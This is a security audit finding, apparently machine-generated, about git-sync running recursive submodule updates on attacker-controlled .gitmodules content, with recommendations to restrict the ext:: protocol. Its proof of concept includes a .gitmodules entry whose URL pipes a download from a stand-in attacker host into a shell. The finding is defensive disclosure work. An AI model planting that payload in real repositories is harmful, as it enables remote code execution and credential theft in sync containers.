### Title
Attacker-controlled `.gitmodules` in synced repo enables arbitrary command execution via `git submodule update --init --recursive` - (File: main.go)

### Summary
The ENS report describes a case where user-supplied data reaches a powerful, loosely-validated execution primitive (`functionCall`) with only a partial check (nodehash match), allowing the attacker to drive privileged behavior beyond what was intended. The closest reachable analog in `git-sync` is that `git-sync` runs `git submodule update --init --recursive` against whatever content is checked out from the (potentially attacker-influenced) synced repository, without restricting the submodule URL schemes/protocols that git itself will honor.

### Finding Description
`git-sync`'s `configureWorktree` unconditionally builds and runs a submodule-update command whenever `--submodules` is not `off` (the default is `recursive`): [1](#0-0) 

This command operates on `.gitmodules`/submodule config that comes entirely from the content of the synced repository/ref — i.e., untrusted, attacker-influenced repo content (analogous to the ENS report's "the only check is the nodehash matches" — here the only "check" is that submodules mode isn't `off`; there is no validation of submodule URLs, schemes, or paths before `git submodule update` is executed). Historically, `git submodule update` processing of a crafted `.gitmodules` with a submodule URL using the `ext::` transport helper (or similarly dangerous URL schemes) is a known vector for arbitrary command execution in vulnerable/unpatched git versions (CVE-2017-1000117, CVE-2018-11235 class issues). `git-sync` does not set `protocol.ext.allow`, `GIT_ALLOW_PROTOCOL`, or otherwise restrict which submodule URL schemes are permitted before invoking submodule update; the mitigation depends entirely on the vendored/host git binary's own defaults.

The generic command runner used for all git invocations, including the submodule command, executes arguments directly via `exec.CommandContext` with no additional sandboxing: [2](#0-1) 

### Impact Explanation
If an attacker can influence the content of the tracked ref (e.g., they have push access to a branch/tag that `git-sync` is configured to follow, or `git-sync` is pointed at a repository/mirror the attacker can partially control), they can add or modify a submodule entry in `.gitmodules` to reference a malicious URL. On a vulnerable or misconfigured git version, `git submodule update --init --recursive` executed by `configureWorktree` could result in arbitrary command execution within the git-sync sidecar container, which typically has elevated file-system access (it writes into `--root`/shared volumes) and may hold read access to credentials (SSH keys, password files, cookie files) configured via `--ssh-key-file`, `--password-file`, `--cookie-file`, etc. This maps to "code execution" and potential "credential or token disclosure" impact categories.

### Likelihood Explanation
Likelihood depends heavily on external factors not controlled by `git-sync` itself:
- It requires either an attacker with push access to the tracked ref, or a compromised/malicious upstream remote that a legitimate operator has configured `--repo` to point at.
- It requires the underlying git binary in the container image to be vulnerable to (or not otherwise mitigated against) unsafe submodule URL schemes — modern git versions restrict `ext::`/protocol helpers by default (`protocol.*.allow=user` is the default posture in current git, requiring explicit opt-in), so a fully patched git binary substantially reduces this risk.
- `git-sync` does explicitly document and support `--submodules=off` as a mitigation, and default submodule behavior is a known, documented feature rather than a hidden loophole — this differs from the ENS bug where the vulnerable code path was not intended to allow user-controlled function selection at all.

Given these caveats (similar to the original finding being downgraded from High to Medium because the "extra" capability created was of limited independent value and the additional exploit surface was speculative/version-dependent), this is best characterized as a **Medium-likelihood, environment-dependent** issue rather than a guaranteed high-likelihood RCE.

### Recommendation
- Explicitly set `protocol.ext.allow=never` (and restrict other protocols such as `file`, unless required) via `git-config-add` before running any submodule operations, rather than relying on the ambient git binary's defaults.
- Consider defaulting `--submodules` to `off` for repositories whose write-access trust level is unknown, and document clearly in the security guidance that `--submodules=recursive` extends the trust boundary to include the "submodule URL" fields of `.gitmodules`, i.e., extends trust from "content of the ref" to "arbitrary URLs referenced by that content."
- Pin/require a git version with hardened submodule URL handling, and consider validating submodule URLs against an allow-list (e.g., same-host as `--repo`) before invoking `git submodule update`.

### Proof of Concept
Conceptual PoC (requires a git version vulnerable to malicious `.gitmodules` URLs, and push access to the synced ref):
1. Attacker with push access to the branch/tag tracked by `git-sync --repo=<repo> --ref=<ref>` (default `--submodules=recursive`) adds a `.gitmodules` file:
   ```
   [submodule "x"]
       path = x
       url = ext::sh -c "curl attacker.example/x | sh"
   ```
2. Attacker pushes/commits this change to the tracked ref.
3. On the next sync cycle, `git-sync` calls `configureWorktree`, which executes: [3](#0-2) 
   i.e., `git submodule update --init --recursive [--depth N]` in the new worktree.
4. On a git binary that honors the `ext::` transport for submodule URLs without additional restriction, this results in execution of the attacker-supplied shell command inside the git-sync container.

Note: I could not fully verify from the indexed code whether `git-sync` sets any `protocol.*.allow` git-config values anywhere in `main.go` (only a partial view of `initRepo` was available in the index), so it's possible the codebase already mitigates this via git-config; this could not be conclusively confirmed with the available tool results. Due to index size limits, the full contents of `initRepo` and any git-config setup performed before submodule operations were not completely visible — starting a Devin session against the full repository would allow confirming whether such protections already exist.
